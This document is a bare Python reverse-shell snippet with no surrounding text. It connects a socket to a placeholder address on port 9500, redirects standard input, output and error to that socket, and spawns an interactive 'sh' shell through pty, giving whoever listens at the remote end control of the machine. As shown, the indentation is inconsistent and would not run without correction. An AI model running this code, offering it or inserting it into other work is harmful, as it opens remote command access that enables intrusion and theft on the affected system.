import socket,subprocess,os,pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("00.00.00.00",9500));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    pty.spawn("sh")
